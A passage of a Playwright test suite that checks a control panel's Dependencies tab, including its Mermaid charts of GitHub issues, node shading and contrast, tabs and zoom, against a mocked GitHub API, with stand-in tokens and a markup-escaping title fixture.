// Checks of the control panel's Dependencies tab (site branch claude/graph-section, 2026-10-18; a
// section of the one long page until the page became a console of tabs, site pull request #40)
// against a mocked GitHub API: the chart text the page builds from GitHub's REST objects, byte for
// byte the two blocks the protocol's board writes for the same state (symphony-protocol
// tests/fixtures/board-epics.json and board-epics-STATE.md, copied below) and the block it writes
// for hostile titles, titles that spell a Mermaid directive or its math and titles the board folds
// to ASCII, the reads it makes and the
// ones it never makes, the vendored Mermaid loaded from the site only when there is a chart and
// drawing both charts with their nodes and classes, a tab of its own in the console's rail after
// Tasks, with its ARIA and its address, the charts drawn while the tab is hidden and shown whole
// when it opens, a node pressed in this tab or in the Board tab opening it in focus, whose Centre
// its row opens the Tasks tab with the task's row centred inside that tab's own box and the window
// left where it was, the assistant's "show dependencies" opening this tab at its first chart, each
// card's list in its chart's place when the drawing script cannot load, a hostile title inert, each stop said in words with nothing half drawn (a 403, a
// 429, the cap, the rate limit's reserve), nothing drawn without an epic, a Refresh redrawing the
// new count, a goal listed with the epics and not as an other issue, a repository switched
// mid-load, a second page of sub-issues read and counted, pull requests and another repository's
// issues left out, a deleted issue read as none, the repository's record unread, a repository
// renamed, a claim shown by its pull request, one chart that cannot be drawn, the board's own charts
// drawn in the Board tab as the board's own bytes, for titles of every printable character too, and
// only where every line is one the board writes, any other block shown as text that reads on its
// ground, a board whose title opens an HTML comment shown whole, the charts on a ground their edges
// show on, a press on a task the tables do not hold staying in this tab, a draw that reads nothing
// once the open issues' answer says the token is under the reserve, the last repository taken off
// the list and an open list cut short, and (AA to AE) the focus strip that, where there are two
// charts or more, shows one epic's chart at a time, a zoomed-out goals chart, or All: its chips and
// ARIA, the first chart shown by default and the rest hidden, a chip showing its chart and hiding
// the others with aria-pressed following, the choice kept per repository in this browser and
// restored on load and on Refresh, no strip for a single chart, and a kept choice that is gone
// falling back to the first, and (AF to AI) the console's look: each chart a card with its bar and
// its pills and its list behind List, the key, the nodes shaded by their state in place of the
// board's light colours, and a wide chart opened whole, and (AJ to AU) the tiles, the moves between
// the charts and what the look's second review found, and (AV to BK) the zoom: nothing scrolling at
// four laptop and monitor sizes at every text size and on a phone held either way, the tiles and the
// buttons sized from the screen, each chart opened whole, the zoom, the pan and the pinch, a node's
// focus with its neighbours and the moves between them, All's grid, Chart and List, the folded key,
// less motion, and the Board tab's charts. Each check states what the page promises; a FAIL is a
// defect. Every token is a stand-in.
//
// The console shows one tab at a time, so each check opens the Dependencies tab by its rail button
// before it reads or presses inside it, and console-tabs.mjs opens any other tab a press names, as
// the other suites do. A press that crosses tabs is read right after it with page.evaluate, which
// opens nothing, so the page and not the helper is what opened the tab. The window is a laptop's,
// 1366 x 657, where the console fills the window and the site's foot lies below it, so the page
// could scroll and no press may move it; AI, AJ and AS open a phone's too, 390 x 844, AM and AR
// a window 800 px wide, where the page scrolls as a whole, and AV to BK the screens each names.
//
// The mutants that prove the checks bite are e2e2/mutants/g*.json, each with the checks that must
// catch it (.only) and this file named as its suite (.suite), and the stylesheet's changed copies
// e2e2/styles/*.json, served through CSSEDIT; e2e2/run-mutants.sh runs both.
import { chromium } from 'playwright';
import { consoleTabs } from './console-tabs.mjs';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import { legacyHome } from './legacy-home.mjs';

const BASE = process.env.BASE || 'http://127.0.0.1:8077';
const SITE = process.env.SITE || '/home/user/openspineconsortium.github.io';
const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const now = new Date().toISOString();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const ONLY = (process.env.ONLY || '').split(',').filter(Boolean);
async function check(name, fn) {
  if (ONLY.length && !ONLY.some((o) => name.startsWith(o + ':'))) return;
  try { await fn(); results.push('PASS ' + name); console.log('PASS', name); }
  catch (e) { results.push('FAIL ' + name + ' :: ' + String(e && e.message || e).split('\n')[0]); console.log('FAIL', name, '\n    ', String(e && e.message || e).split('\n').slice(0, 4).join('\n     ')); }
}

// These checks paste a token, which the page shows open only while the sign-in is off, so the page
// is served the shipped script with its two sign-in constants emptied. A check that needs another
// cap serves its own copy (open's opts.constants).
let script = fs.readFileSync(SITE + '/assets/js/symphony-panel.js', 'utf8');
// A mutant's replacement goes in as written: given as a string, replace() would read "$'" and the
// like in it as patterns, and g01's "['$', ..." put the rest of the script there, so the page broke
// on load and the mutant was caught for that and not for its change.
if (process.env.MUTANT) for (const [a, b] of JSON.parse(fs.readFileSync(process.env.MUTANT, 'utf8'))) { assert.ok(script.includes(a), 'mutant text not found: ' + a.slice(0, 60)); script = script.replace(a, () => b); }
script = script.replace(/var SIGNIN_SERVICE = '[^']*';/, "var SIGNIN_SERVICE = '';").replace(/var CLIENT_ID = '[^']*';/, "var CLIENT_ID = '';");
function withConstants(source, constants) {
  for (const [name, value] of Object.entries(constants)) {
    const line = new RegExp('var ' + name + ' = [0-9]+;');
    assert.ok(line.test(source), 'the constant ' + name + ' was not found in the script');
    source = source.replace(line, 'var ' + name + ' = ' + value + ';');
  }
  return source;
}

const resp = (status, body, extra) => Object.assign({ __r: true, status, body }, extra || {});
const VENDOR = '**/assets/js/vendor/mermaid.min.js*';
// a stand-in for the drawing library that records the text it is handed and draws nothing
const STUB = "window.mermaid = { initialize: function (c) { window.__init = c; }, render: function (id, text) { (window.__charts = window.__charts || []).push(text); return Promise.resolve({ svg: '<svg data-stub=\"1\"></svg>' }); } };";
const stubRoute = [VENDOR, (route) => route.fulfill({ status: 200, contentType: 'application/javascript', body: STUB })];
const missingRoute = [VENDOR, (route) => route.fulfill({ status: 404, contentType: 'text/plain', body: 'gone' })];

// The library's fixture as GitHub's REST objects: the open list (labels as objects, the two summaries
// as GitHub gives them), what GET issues/N/sub_issues and issues/N/dependencies/blocked_by answer, and
// the one issue the open list lacks (#21, closed).
function issue(n, title, labels, extra) {
  return Object.assign({
    number: n, title, state: 'open', html_url: 'https://github.com/acme/demo/issues/' + n, repository_url: 'https://api.github.com/repos/acme/demo',
    labels: labels.map((name) => ({ name })), updated_at: now,
  }, extra || {});
}
const deps = (blocked_by, total_blocked_by) => ({ issue_dependencies_summary: { blocked_by, blocking: 0, total_blocked_by, total_blocking: 0 } });
const subs = (completed, total) => ({ sub_issues_summary: { total, completed, percent_completed: total ? Math.round(100 * completed / total) : 0 } });
function fixture(completed) {
  const i20 = issue(20, 'Draw the board', ['epic'], Object.assign(subs(completed === undefined ? 1 : completed, 3), deps(0, 0)));
  const i21 = issue(21, 'Read the summary', ['todo'], { state: 'closed' });
  const i22 = issue(22, 'Render the section', ['claimed', 'worker:alice'], deps(1, 1));
  const i23 = issue(23, 'Write the body | with "quotes" and <tags> #5 and a title long enough to be cut short', ['todo'], deps(1, 2));
  const i24 = issue(24, 'Write the docs', ['todo', 'worker:bob'], deps(2, 2));
  const i25 = issue(25, 'Fix the build', ['blocker'], deps(1, 1));
  const i30 = issue(30, 'Ship the graph', ['goal', 'todo'], subs(0, 1));
  const i99 = issue(99, 'Settle the colours', ['todo']);
  return {
    open: [i20, i22, i23, i24, i25, i30, i99],
    subIssues: { 20: [i21, i22, i23], 30: [i20] },
    blockedBy: { 22: [i99], 23: [i21, i22] },
  };
}
// The two blocks of tests/fixtures/board-epics-STATE.md at FIXTURE_COMMIT, the fence lines dropped:
// what the page must hand the drawing for the goals and for epic #20. Check A0 compares them with a
// checkout of symphony-protocol where SYMPHONY_PROTOCOL names one, so a change to the library's
// fixture is seen before the page drifts from the board; the commit says where to diff from.
const FIXTURE_COMMIT = '468fc44';
const GOALS_TEXT = [
  'flowchart TD',
  '  i20["#20 Draw the board (1/3)"]',
  '  i30["#30 Ship the graph (0/1)"]:::todo',
  '  i30 ==> i20',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
const EPIC_20_TEXT = [
  'flowchart TD',
  '  i21["#21 Read the summary"]:::closed',
  '  i22["#22 Render the section"]:::claimed',
  '  i23["#23 Write the body #124; with #quot;quotes#quot; and #lt;t..."]:::todo',
  '  i99["#99 Settle the colours"]:::todo',
  '  i21 -.-> i23',
  '  i22 --> i23',
  '  i99 --> i22',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
const board = '# Board\n\nAs of commit 0123abc on main. Rewritten by .github/workflows/board.yml; do not edit by hand.\n\n## Claims (open claude/<issue> branches and docs/agents/claims/<issue>.md)\n\n| Issue | Branch | Worker | PR | Files it touches |\n| --- | --- | --- | --- | --- |\n| #22 | claude/22 | alice | (no pull request yet) | sdlc_protocol/board.py |\n';

function baseRoutes(repo, tasks) {
  return {
    'GET /user': { login: 'tester' },
    ['GET /repos/' + repo]: { full_name: repo, default_branch: 'main', private: false, topics: ['symphony'], id: 123, owner: { id: 77, login: 'acme' } },
    ['GET /repos/' + repo + '/issues']: tasks || [],
    ['GET /repos/' + repo + '/contents/STATE.md']: { encoding: 'base64', content: b64(board) },
    ['GET /repos/' + repo + '/branches/board']: { commit: { commit: { committer: { date: now } } } },
    ['GET /repos/' + repo + '/contents/.github/symphony/workers']: [],
    ['GET /repos/' + repo + '/actions/runs']: { workflow_runs: [] },
    ['GET /repos/' + repo + '/pulls']: [],
  };
}
// the routes of the fixture's repository: the open list and the four answers the reads get
function fixtureRoutes(f) {
  const routes = baseRoutes('acme/demo', f.open);
  for (const n of Object.keys(f.subIssues)) routes['GET /repos/acme/demo/issues/' + n + '/sub_issues'] = f.subIssues[n];
  for (const n of Object.keys(f.blockedBy)) routes['GET /repos/acme/demo/issues/' + n + '/dependencies/blocked_by'] = f.blockedBy[n];
  return routes;
}
// the colours the stylesheet gives each state, as getComputedStyle gives them, and the edge each
// has; no two of the six differ by hue alone (assertNotHueAlone): blocked thick, claimed dotted,
// closed dashed and struck through, in review on a fill lit well above to do's, and open with a thin
// pale edge far lighter than to do's green
const SHADES = {
  todo: { fill: 'rgb(16, 38, 27)', stroke: 'rgb(63, 185, 80)', width: '1.5px', dash: 'none' },
  claimed: { fill: 'rgb(42, 36, 18)', stroke: 'rgb(227, 179, 65)', width: '2.5px', dash: '0.5px, 5px' },
  review: { fill: 'rgb(34, 70, 111)', stroke: 'rgb(88, 166, 255)', width: '1.5px', dash: 'none' },
  blocked: { fill: 'rgb(69, 28, 32)', stroke: 'rgb(248, 81, 73)', width: '3px', dash: 'none' },
  closed: { fill: 'rgb(21, 27, 26)', stroke: 'rgb(111, 125, 120)', width: '1.5px', dash: '4px, 3px' },
  '': { fill: 'rgb(22, 34, 31)', stroke: 'rgb(194, 204, 200)', width: '1px', dash: 'none' },
};
// every drawn node under a box, as AH and R5 read them: its number and state, any colour left on its
// own elements, its shade, edge and corners, its words' colour and line, and whether its words are
// wider or taller than its box
const readNodes = (page, box) => page.$$eval(box + ' .control__chart g.node', (gs) => gs.map((g) => {
  const rect = g.querySelector(':scope > rect.label-container');
  const fo = g.querySelector('foreignObject'), div = fo && fo.firstElementChild, words = g.querySelector('.nodeLabel');
  const cs = rect ? getComputedStyle(rect) : {}, ws = words ? getComputedStyle(words) : {};
  return {
    n: Number(/-flowchart-i([0-9]+)-/.exec(g.id)[1]),
    state: ['todo', 'claimed', 'review', 'blocked', 'closed'].find((c) => g.classList.contains(c)) || '',
    inline: [g].concat(Array.from(g.querySelectorAll('[style]'))).flatMap((e) => ['fill', 'stroke', 'color'].filter((k) => e.style.getPropertyValue(k))),
    fill: cs.fill, stroke: cs.stroke, width: cs.strokeWidth, dash: cs.strokeDasharray, rx: rect ? rect.getAttribute('rx') : null, color: ws.color, line: ws.textDecorationLine,
    // Mermaid's box is 2 px shorter than its words' own height, whatever their face; a label cut
    // short loses a whole line, 20 px and more
    cut: !div || div.scrollWidth > Number(fo.getAttribute('width')) + 1 || div.scrollHeight > Number(fo.getAttribute('height')) + 4,
  };
}));
function assertShaded(nodes) {
  for (const x of nodes) {
    assert.deepEqual(x.inline, [], 'node #' + x.n + ' keeps the board\'s colours on its own elements, where the stylesheet cannot reach');
    const want = SHADES[x.state];
    assert.deepEqual([x.fill, x.stroke, x.width, x.dash], [want.fill, want.stroke, want.width, want.dash], 'node #' + x.n + ' (' + (x.state || 'plain') + ') is not shaded and edged by its state');
    assert.equal(x.rx, '10', 'node #' + x.n + '\'s box is not rounded');
    assert.deepEqual([x.color, x.line], x.state === 'closed' ? ['rgb(138, 152, 147)', 'line-through'] : ['rgb(228, 236, 232)', 'none'], 'node #' + x.n + '\'s words');
    assert.equal(x.cut, false, 'node #' + x.n + '\'s words are wider or taller than its box');
  }
}
// WCAG's relative luminance of a colour as getComputedStyle gives it, and the ratio of two such
const luminance = (c) => c.match(/[0-9.]+/g).slice(0, 3).map(Number).map((x) => { x /= 255; return x <= 0.03928 ? x / 12.92 : Math.pow((x + 0.055) / 1.055, 2.4); }).reduce((sum, x, i) => sum + x * [0.2126, 0.7152, 0.0722][i], 0);
const lightRatio = (a, b) => { const p = luminance(a) + 0.05, q = luminance(b) + 0.05; return Math.max(p, q) / Math.min(p, q); };
// no two of the six states, as drawn, differ by hue alone, so a reader who does not tell red from
// green or blue from green, or a screen of greys, still tells them apart: each pair differs in its
// edge's dash, in its edge's width by a pixel or more, in its words' line, or by 1.4 to 1 or more in
// the lightness of its edge or of its fill, a step that shows in greys
function assertNotHueAlone(nodes) {
  const byState = {};
  for (const x of nodes) byState[x.state] = x;
  const states = Object.keys(byState);
  assert.equal(states.length, 6, 'not every state is drawn: ' + states.join());
  for (let i = 0; i < states.length; i++) {
    for (let j = i + 1; j < states.length; j++) {
      const a = byState[states[i]], b = byState[states[j]];
      const apart = a.dash !== b.dash || Math.abs(parseFloat(a.width) - parseFloat(b.width)) >= 1 || a.line !== b.line
        || lightRatio(a.stroke, b.stroke) >= 1.4 || lightRatio(a.fill, b.fill) >= 1.4;
      assert.ok(apart, (a.state || 'open') + ' and ' + (b.state || 'open') + ' differ by hue alone: ' + JSON.stringify([a, b]));
    }
  }
}
// The fixture with a node of each of the six states in epic #20's chart: #23 blocked, and #99, the
// blocker from outside the epic, in review.
function fixtureStates() {
  const f = fixture();
  f.open = f.open.map((it) => it.number === 23 ? Object.assign({}, it, { labels: [{ name: 'blocked' }] }) : it.number === 99 ? Object.assign({}, it, { labels: [{ name: 'in-review' }] }) : it);
  return f;
}
// The site's face served late and wide: the page's Google Fonts stylesheet answered with one face,
// "IBM Plex Sans", a local DejaVu Sans drawn 160% wide (size-adjust), whose file waits until release
// is called; so a chart measured before the face arrives is cut once it does, and one measured after
// it fits. The drawing script is served from the site's file here, so a check can start a clock when
// it has been handed over.
const FACE_FILE = process.env.FACE_FILE || '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf';
function lateFace(onScript) {
  assert.ok(fs.existsSync(FACE_FILE), 'no font file at ' + FACE_FILE + ' to serve as the site\'s face; set FACE_FILE to a .ttf');
  let release;
  const gate = new Promise((r) => { release = r; });
  const cors = { 'Access-Control-Allow-Origin': '*' };
  const css = "@font-face { font-family: 'IBM Plex Sans'; font-style: normal; font-weight: 100 900; src: url(https://fonts.gstatic.com/late/plex.ttf) format('truetype'); size-adjust: 160%; font-display: swap; }";
  const routes = [
    ['https://fonts.googleapis.com/**', (route) => route.fulfill({ status: 200, contentType: 'text/css', headers: cors, body: css })],
    ['https://fonts.gstatic.com/**', async (route) => { await gate; try { await route.fulfill({ status: 200, contentType: 'font/ttf', headers: cors, body: fs.readFileSync(FACE_FILE) }); } catch (e) { /* the page that asked is gone */ } }],
    [VENDOR, async (route) => { await route.fulfill({ status: 200, contentType: 'application/javascript', body: fs.readFileSync(SITE + '/assets/js/vendor/mermaid.min.js') }); onScript(release); }],
  ];
  return { routes, release: () => release() };
}
// the site's face loaded and laid out, so a label measured in another face would show cut by now
const faceIn = (page) => page.waitForFunction(() => Array.from(document.fonts).some((f) => f.family.replace(/["']/g, '') === 'IBM Plex Sans' && f.status === 'loaded'), null, { timeout: 15000 })
  .then(() => page.evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)))));
const dependencyReads = (calls) => calls.filter((c) => /^GET \/repos\/[^/]+\/[^/]+\/issues\/[0-9]+\/(sub_issues|dependencies\/blocked_by)$/.test(c.key)).map((c) => c.key);
const writes = (calls) => calls.filter((c) => !/^GET /.test(c.key)).map((c) => c.key);
const EXPECTED_READS = [
  'GET /repos/acme/demo/issues/20/sub_issues',
  'GET /repos/acme/demo/issues/22/dependencies/blocked_by',
  'GET /repos/acme/demo/issues/23/dependencies/blocked_by',
  'GET /repos/acme/demo/issues/30/sub_issues',
];

const browser = await chromium.launch();
await consoleTabs(browser);
// a laptop's window, where the console holds the window and the tabs fit inside it
const VIEW = { width: 1366, height: 657 };
// the mocked API records every call; a route may be a function of the url, the request, the record
// and the route itself, may answer later (delayMs), and answers 204 and 304 with no body; the
// drawing script is served from the site unless a check routes it (opts.extraRoutes); every request
// the page makes, the dialogs it opens and the pages it opens are recorded
async function open(routes, opts) {
  opts = opts || {};
  const served = opts.constants ? withConstants(script, opts.constants) : script;
  // a phone (opts.mobile) is a narrow window with touch, as Playwright emulates one, so the console's
  // phone layout and its finger-sized buttons show, and a check can send touches of two fingers
  const context = await browser.newContext({ viewport: opts.viewport || VIEW, hasTouch: !!opts.mobile, isMobile: !!opts.mobile, reducedMotion: opts.reducedMotion || 'no-preference' });
  await legacyHome(context);
  const calls = [];
  await context.route('https://api.github.com/**', async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const key = req.method() + ' ' + url.pathname;
    const sent = req.headers();
    const call = { key, url: req.url(), auth: sent['authorization'], body: safeJson(req), at: Date.now() };
    calls.push(call);
    let r = routes[key];
    if (typeof r === 'function') r = r(url, req, call, route);
    if (r && typeof r.then === 'function') r = await r;
    const headers = { 'Access-Control-Expose-Headers': 'ETag, Link' };
    if (r === undefined) return route.fulfill({ status: 404, contentType: 'application/json', headers, body: JSON.stringify({ message: 'Not Found' }) });
    const spec = (r && r.__r) ? r : { status: 200, body: r };
    if (spec.delayMs) await sleep(spec.delayMs);
    Object.assign(headers, spec.headers || {});
    if (/raw\+json/.test(sent['accept'] || '') && spec.body && spec.body.encoding === 'base64') {
      return route.fulfill({ status: spec.status, contentType: 'application/vnd.github.raw+json', headers, body: Buffer.from(spec.body.content, 'base64').toString('utf8') });
    }
    if (spec.status === 204 || spec.status === 304) return route.fulfill({ status: spec.status, headers, body: '' });
    return route.fulfill({ status: spec.status, contentType: 'application/json', headers, body: JSON.stringify(spec.body) });
  });
  await context.route('**/assets/js/symphony-panel.js*', (route) => route.fulfill({ status: 200, contentType: 'application/javascript', body: served }));
  if (process.env.NOCSS || process.env.CSSEDIT) await context.route('**/assets/css/control.css*', (route) => route.fulfill({ status: 200, contentType: 'text/css', body: servedStylesheet() }));
  if (opts.extraRoutes) for (const [pattern, handler] of opts.extraRoutes) await context.route(pattern, handler);
  // every scrollIntoView the page makes, so a check can tell what it centred
  await context.addInitScript(() => {
    window.__scrolled = [];
    const original = Element.prototype.scrollIntoView;
    Element.prototype.scrollIntoView = function () {
      window.__scrolled.push(this.tagName + ':' + (this.textContent || '').trim().slice(0, 40));
      return original.apply(this, arguments);
    };
  });
  const page = await context.newPage();
  // every page opened after this one, such as a tab a press opens, which comes a moment after the
  // press
  const opened = [];
  context.on('page', (p) => opened.push(p));
  const errors = [], requests = [], dialogs = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  page.on('console', (m) => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) errors.push(m.text()); });
  page.on('request', (r) => requests.push(r.url()));
  page.on('dialog', async (d) => { dialogs.push(d.type() + ': ' + d.message()); await d.dismiss(); });
  await page.goto(BASE + '/symphony/control/', { waitUntil: opts.waitUntil || 'load' });
  await page.evaluate((s) => { localStorage.clear(); sessionStorage.clear(); for (const k in s) localStorage.setItem(k, s[k]); }, opts.storage || {});
  // a check that holds a font back waits only for the document, since the load event waits for the font
  await page.goto(BASE + (opts.path || '/symphony/control/?repo=acme/demo'), { waitUntil: opts.waitUntil || 'load' });
  return { context, page, calls, errors, requests, dialogs, opened };
}
function safeJson(req) { try { return req.postDataJSON(); } catch (e) { return req.postData(); } }
// With NOCSS set, the site's stylesheet is served without its rules for a chart's nodes, the shade,
// edge and words of each state (the mutants change only the script, and these are the half of the
// console's look no mutant reaches): a run with NOCSS shows AH and R5 failing, the nodes left in
// Mermaid's own colours or the board's light ones. Until the console's look this switch took the
// chart's light ground away and C and R failed; the ground is now a shade off the deck's, which the
// deck's own ground matches closely enough that nothing fails without it.
const NODE_RULE = /^:is\(#cp-graph, #cp-board\) \.control__chart \.node[^\n]*\n/gm;
function withoutNodeRules(css) {
  const rules = css.match(NODE_RULE) || [];
  assert.ok(rules.length >= 8, 'the node rules were not found in the stylesheet');
  return css.replace(NODE_RULE, '');
}
// With CSSEDIT naming a file of pairs, as MUTANT does for the script, the stylesheet is served with
// the first occurrence of each text replaced: the stylesheet's part of the zoom (the tab held to the
// screen, the room a focus takes on a phone, the folded key, the buttons sized to the screen, the
// stage that never scrolls, the stillness asked for) is reached by no mutant of the script, so each
// rule is proved by a changed copy of e2e2/styles/ that fails the checks its .only names.
function servedStylesheet() {
  let css = fs.readFileSync(SITE + '/assets/css/control.css', 'utf8');
  if (process.env.NOCSS) css = withoutNodeRules(css);
  if (process.env.CSSEDIT) for (const [a, b] of JSON.parse(fs.readFileSync(process.env.CSSEDIT, 'utf8'))) { assert.ok(css.includes(a), 'mutant text not found: ' + a.slice(0, 60)); css = css.replace(a, () => b); }
  return css;
}
// signs in with the pasted token and opens the tab named, the Dependencies tab unless a check wants
// to stay where the console opened (null)
async function signIn(page, tab) {
  await page.fill('#cp-token', 'github_pat_TEST');
  await page.click('#cp-open');
  await page.waitForSelector('#cp-app:not(.hidden)', { timeout: 8000 });
  if (tab !== null) await toTab(page, tab || 'dependencies');
}
// a tab opened as a person opens it, by its rail button; on a phone the buttons are the home
// screen's (site branch claude/project-thread-6cxgh2), so a tab shown is left by its back button first
async function toTab(page, name) {
  if (await page.isVisible('#cp-back')) {
    await page.click('#cp-back');
    await page.waitForFunction(() => document.getElementById('console').classList.contains('console--home'), null, { timeout: 8000 });
  }
  await page.click('#rail-' + name);
  await page.waitForFunction((n) => !document.getElementById('tab-' + n).hidden && location.hash === '#' + n, name, { timeout: 8000 });
}
// where the console stands, read without opening anything: the address, the tabs shown, the window's
// offset, and whether the page could scroll at all, which is what makes an offset of 0 mean something.
// The console page fits the window and does not scroll since the layout of site #60 (the owner asked
// not to scroll past it to the site's foot), so the check gives the page room below it, a block of its
// own and the body let scroll, for a window that moved to show up as an offset.
const where = (page) => page.evaluate(() => {
  if (!document.getElementById('check-room')) {
    const room = document.createElement('div');
    room.id = 'check-room';
    room.style.height = '150vh';
    document.body.appendChild(room);
    document.body.style.overflow = 'visible';
  }
  return {
  hash: location.hash,
  shown: Array.from(document.querySelectorAll('[data-tab-panel]')).filter((p) => !p.hidden).map((p) => p.getAttribute('data-tab-panel')),
  y: window.pageYOffset,
  scrollable: document.documentElement.scrollHeight > window.innerHeight,
  };
});
// whether a node lies wholly inside the box its tab scrolls, and that box inside the window
const inBox = (page, selector) => page.$eval(selector, (node) => {
  const box = node.closest('.console__scroll');
  if (!box) return 'in no tab\'s box';
  const a = node.getBoundingClientRect(), b = box.getBoundingClientRect();
  if (!(a.height > 0)) return 'not drawn';
  if (a.top < b.top - 1 || a.bottom > b.bottom + 1) return 'outside its box: ' + Math.round(a.top) + '..' + Math.round(a.bottom) + ' against ' + Math.round(b.top) + '..' + Math.round(b.bottom);
  if (b.bottom > window.innerHeight + 1) return 'its box runs past the window';
  return 'in view';
});
// the page's message line, outside every tab, which every tab shows
const msgText = (page) => page.textContent('#msg');
const stateText = (page) => page.textContent('#cp-graph-state');
const waitGraph = (page, re, timeout) => page.waitForFunction((src) => new RegExp(src).test(document.getElementById('cp-graph-state').textContent), re.source, { timeout: timeout || 8000 });
const vendorLoads = (requests) => requests.filter((u) => /\/assets\/js\/vendor\/mermaid\.min\.js/.test(u)).length;
const headings = (page) => page.$$eval('#cp-graph h3', (hs) => hs.map((h) => h.textContent));
// for each node the selector names, the contrast against the ground it sits on (the nearest box,
// itself first, with a colour of its own) of its own words and, where it holds a drawn chart, of
// the chart's first edge and first arrowhead, as WCAG's relative luminance gives it; a ratio, not a
// colour, so the console's shades may change
const contrastOf = (page, selector) => page.$$eval(selector, (nodes) => {
  const rgb = (c) => { const m = /rgba?\(([^)]+)\)/.exec(c || ''); return m ? m[1].split(',').map((x) => parseFloat(x)) : null; };
  const lum = (c) => [0, 1, 2].map((i) => { const v = c[i] / 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }).reduce((sum, v, i) => sum + v * [0.2126, 0.7152, 0.0722][i], 0);
  const ratio = (a, b) => (a && b) ? Math.round(100 * (Math.max(lum(a), lum(b)) + 0.05) / (Math.min(lum(a), lum(b)) + 0.05)) / 100 : 0;
  const ground = (node) => { for (let n = node; n; n = n.parentElement) { const c = rgb(getComputedStyle(n).backgroundColor); if (c && (c.length < 4 || c[3] > 0)) return c; } return [255, 255, 255]; };
  const paint = (node, prop) => { if (!node) return null; const v = getComputedStyle(node)[prop]; return v && v !== 'none' ? rgb(v) : null; };
  return nodes.map((h) => {
    const g = ground(h), seen = { tag: h.tagName, ground: g, words: ratio(rgb(getComputedStyle(h).color), g) };
    if (!h.querySelector('svg')) return seen;
    const edge = h.querySelector('.edgePaths path'), arrow = h.querySelector('marker path');
    return Object.assign(seen, { edge: ratio(paint(edge, 'stroke'), g), arrow: ratio(paint(arrow, 'fill') || paint(arrow, 'stroke'), g) });
  });
});
// for each drawn chart in a box, its edges', its arrowheads' and its host's own words' contrast
const chartContrast = (page, scope) => contrastOf(page, scope + ' .control__chart').then((seen) => seen.filter((c) => 'edge' in c));
// the edges and arrowheads show on their ground (3 to 1, WCAG's floor for a graphic), and the host's
// own words, "Drawing the chart..." and a failure, read on it (4.5 to 1)
function assertContrast(seen) {
  assert.ok(seen.length > 0, 'no drawn chart to measure');
  for (const c of seen) {
    assert.ok(c.edge >= 3 && c.arrow >= 3, 'a chart\'s edges or arrowheads barely show on its ground: ' + JSON.stringify(c));
    assert.ok(c.words >= 4.5, 'a chart\'s own words barely read on its ground: ' + JSON.stringify(c));
  }
}

// The stage a chart is drawn on (the site's symphony-panel.js, "the stage"), read without opening
// anything: the picture's place and scale as its transform gives them, its natural size from its
// viewBox, the stage's inner box on the screen, the picture's box, each node's box and those outside
// the stage, the card's tools where they float over the stage's corner (a short tab), and whether
// the stage scrolled or glides. The stage of the card shown, unless a selector names another.
const stageRead = (page, sel) => page.evaluate((sel) => {
  const shown = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const host = sel ? document.querySelector(sel) : shown && shown.querySelector('.control__chart');
  if (!host) return null;
  const svg = Array.from(host.querySelectorAll(':scope > svg')).find((s) => s.style.display !== 'none');
  if (!svg) return null;
  const m = /translate\(([-0-9.e]+)px, ([-0-9.e]+)px\) scale\(([0-9.e-]+)\)/.exec(svg.style.transform) || [];
  // the console's text size is a CSS zoom on the deck, so the stage's own pixels are the screen's
  // over z
  const hb = host.getBoundingClientRect(), z = host.offsetWidth ? hb.width / host.offsetWidth : 1;
  const inner = { l: hb.left + host.clientLeft * z, t: hb.top + host.clientTop * z, r: hb.left + (host.clientLeft + host.clientWidth) * z, b: hb.top + (host.clientTop + host.clientHeight) * z };
  const sb = svg.getBoundingClientRect();
  const nodes = Array.from(svg.querySelectorAll('g.node')).map((g) => {
    const r = g.getBoundingClientRect();
    return { n: Number((/-flowchart-i([0-9]+)-/.exec(g.id) || [])[1]), x: (r.left + r.right) / 2, y: (r.top + r.bottom) / 2, l: r.left, t: r.top, r: r.right, b: r.bottom, focal: g.classList.contains('graph__focal') };
  });
  const sec = host.closest('.graph__section'), tools = sec && sec.querySelector('.graph__tools');
  const floating = tools && getComputedStyle(tools).position === 'absolute' ? tools.getBoundingClientRect() : null;
  // the corner the floating tools take from the stage, in the stage's own pixels with 4 to spare,
  // as the page reckons it (graphCorner), where they lie over it
  const corner = floating && !(floating.right <= hb.left || floating.bottom <= hb.top || floating.left >= hb.right || floating.top >= hb.bottom)
    ? { w: (floating.right - hb.left) / z - host.clientLeft + 4, h: (floating.bottom - hb.top) / z - host.clientTop + 4 } : null;
  const w = svg.viewBox ? svg.viewBox.baseVal.width : svg.offsetWidth, h = svg.viewBox ? svg.viewBox.baseVal.height : svg.offsetHeight;
  return {
    k: Number(m[3]), x: Number(m[1]), y: Number(m[2]), w, h, box: [host.clientWidth, host.clientHeight], z, inner, corner,
    pic: { l: sb.left, t: sb.top, r: sb.right, b: sb.bottom }, nodes,
    outside: nodes.filter((r) => r.l < inner.l - 1 || r.r > inner.r + 1 || r.t < inner.t - 1 || r.b > inner.b + 1).map((r) => r.n),
    under: floating ? nodes.filter((r) => r.r > floating.left && r.l < floating.right && r.b > floating.top && r.t < floating.bottom).map((r) => r.n) : [],
    floating: !!floating, near: svg.classList.contains('graph__nearsvg'), glide: svg.classList.contains('stage__glide'),
